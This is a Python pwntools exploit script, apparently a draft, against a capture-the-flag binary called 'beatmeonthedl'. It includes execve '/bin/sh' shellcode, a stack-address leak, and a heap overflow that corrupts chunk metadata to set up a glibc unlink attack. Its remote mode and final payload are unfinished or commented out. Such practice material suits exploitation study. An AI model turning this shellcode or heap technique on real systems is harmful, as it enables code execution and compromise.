from pwn import *
import time

remote = False
filename = "./beatmeonthedl"
if remote:
	print 'TODO'
else:
	p = process(filename)

context.binary = ELF(filename)
context.log_level = 'debug'

# get heap address of our shellcode
#shellcode_addr = data.split("\n")[11].split("loc=")[1].split("]")[0]
#shellcode_addr = p32(int(shellcode_addr,16)+8)


# use unlink to overwrite printf ptr in the GOT
#payload = "\xfc\xbf\x04\x08" + shellcode_addr

shellcode = "\x31\xc9\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# send payload, we're also overwriting the PREV_INUSE flag of the next chunk
# we do this so that when the chunk before our chunk gets freed, free thinks
# our chunk is not in use and tries to coalesce which causes an overwrite.

# see https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/
# and https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

#payload += "\x90"*21 + shellcode + "\x90"*204 + "\x78\x03\x00\x00"



if not remote:
	gdb.attach(p, '''
	set disassembly-flavor intel
	set height 0
	c
	''')
	#break *0x400ddb



p.readuntil(":")
p.send("A"*16)
p.readuntil(": ")
leaked = p.readuntil(":")

start = leaked.find("A"*16)+16
print start, leaked
print len(leaked[start:])
stack_ptr = u64(leaked[start:leaked.find("\n", start+1)] + "\x00\x00")
print "Leaked stack address: 0x{:x}".format(stack_ptr)

p.send("mcfly")
p.readuntil(":")
p.send("awesnap")

def create(p, data):
	p.readuntil("|")
	p.send("1")
	p.readuntil(">")
	p.send(data)

def delete(p, num):
	p.readuntil("|")
	p.send("3")
	p.send(str(num))

def edit(p, num, data):
	readdata = p.readuntil("|")
	p.send("4")
	readdata += p.readuntil(":")
	p.send(str(num))
	p.send(data)
	return readdata

create(p, "A"*0x38)
create(p, "B"*0x38)
create(p, "C"*0x38)
create(p, "D"*0x38)

delete(p, 1)

edit(p, 0, "E"*0x38 + p64(0x41) + "E"*8 + "F"*8)

#p.readuntil("|")
#p.send("2")

#p.sendline(payload)
p.interactive()




